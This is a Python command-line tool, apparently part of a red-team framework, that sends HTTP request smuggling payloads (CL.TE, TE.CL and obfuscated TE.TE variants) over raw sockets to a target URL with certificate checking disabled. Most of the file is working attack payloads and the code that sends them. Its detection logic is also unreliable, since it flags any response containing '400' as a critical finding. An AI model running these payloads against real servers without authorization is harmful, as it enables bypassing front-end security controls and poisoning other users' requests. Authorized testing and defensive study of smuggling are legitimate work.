#!/usr/bin/env python3
"""
HTTP Request Smuggling Tester - REDHAVEN Framework
Tests for CL.TE, TE.CL, and TE.TE smuggling vulnerabilities
"""

import sys
import argparse
import requests
import socket
import ssl

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  HTTP REQUEST SMUGGLING - CL.TE/TE.CL/TE.TE Testing     ║
║  Part of REDHAVEN Framework v1.2                         ║
╚══════════════════════════════════════════════════════════╝
"""

class SmugglingTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.findings = []
    
    def test_cl_te(self, host: str, path: str, use_ssl: bool = True) -> bool:
        """Test CL.TE smuggling (Content-Length processed by front-end, TE by back-end)."""
        print(f"[*] Testing CL.TE smuggling on {host}{path}")
        
        # Payload: Front-end uses CL, back-end uses TE
        smuggled_request = (
            "POST / HTTP/1.1\r\n"
            "Host: vulnerable.com\r\n"
            "Content-Length: 13\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "SMUGGLED"
        )
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            f"{smuggled_request}"
        )
        
        try:
            response = self._send_raw_request(host, payload, use_ssl)
            
            if "SMUGGLED" in response or "400" in response or "413" in response:
                self.findings.append({
                    'type': 'CL.TE_SMUGGLING',
                    'severity': 'CRITICAL',
                    'url': self.target_url,
                    'description': 'CL.TE request smuggling detected'
                })
                print(f"    [!!!] CL.TE smuggling DETECTED")
                return True
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return False
    
    def test_te_cl(self, host: str, path: str, use_ssl: bool = True) -> bool:
        """Test TE.CL smuggling (TE processed by front-end, CL by back-end)."""
        print(f"[*] Testing TE.CL smuggling on {host}{path}")
        
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        )
        
        try:
            response = self._send_raw_request(host, payload, use_ssl)
            
            if "Unrecognized method GPOST" in response or "400" in response:
                self.findings.append({
                    'type': 'TE.CL_SMUGGLING',
                    'severity': 'CRITICAL',
                    'url': self.target_url,
                    'description': 'TE.CL request smuggling detected'
                })
                print(f"    [!!!] TE.CL smuggling DETECTED")
                return True
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return False
    
    def test_te_te(self, host: str, path: str, use_ssl: bool = True) -> bool:
        """Test TE.TE smuggling (using obfuscated Transfer-Encoding headers)."""
        print(f"[*] Testing TE.TE smuggling on {host}{path}")
        
        # Try different TE obfuscations
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked, identity",
        ]
        
        for te_header in obfuscations:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n"
                "Content-Length: 4\r\n"
                "\r\n"
                "5c\r\n"
                "GPOST / HTTP/1.1\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 15\r\n"
                "\r\n"
                "x=1\r\n"
                "0\r\n"
                "\r\n"
            )
            
            try:
                response = self._send_raw_request(host, payload, use_ssl)
                
                if "Unrecognized" in response or "400" in response:
                    self.findings.append({
                        'type': 'TE.TE_SMUGGLING',
                        'severity': 'CRITICAL',
                        'url': self.target_url,
                        'header': te_header,
                        'description': 'TE.TE request smuggling detected'
                    })
                    print(f"    [!!!] TE.TE smuggling DETECTED with: {te_header[:50]}")
                    return True
            except Exception as e:
                pass
        
        return False
    
    def _send_raw_request(self, host: str, payload: str, use_ssl: bool = True) -> str:
        """Send raw HTTP request via socket."""
        port = 443 if use_ssl else 80
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        sock.sendall(payload.encode())
        
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        sock.close()
        return response.decode('utf-8', errors='ignore')

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Tester")
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--no-ssl', action='store_true', help='Use HTTP instead of HTTPS')
    
    args = parser.parse_args()
    
    # Parse URL
    from urllib.parse import urlparse
    parsed = urlparse(args.url)
    host = parsed.netloc
    path = parsed.path or '/'
    use_ssl = not args.no_ssl
    
    tester = SmugglingTester(args.url)
    
    print(f"[*] Target: {args.url}")
    print("="*70)
    
    # Run all tests
    tester.test_cl_te(host, path, use_ssl)
    tester.test_te_cl(host, path, use_ssl)
    tester.test_te_te(host, path, use_ssl)
    
    # Report
    print("\n" + "="*70)
    if tester.findings:
        print(f"[!!!] FOUND {len(tester.findings)} REQUEST SMUGGLING VULNERABILITIES")
        print("="*70)
        
        for finding in tester.findings:
            print(f"\n[!!!] {finding['type']}:")
            print(f"  Severity: {finding['severity']}")
            print(f"  URL: {finding['url']}")
            print(f"  {finding['description']}")
    else:
        print("[-] No request smuggling vulnerabilities detected")
    
    print("="*70)

if __name__ == '__main__':
    main()
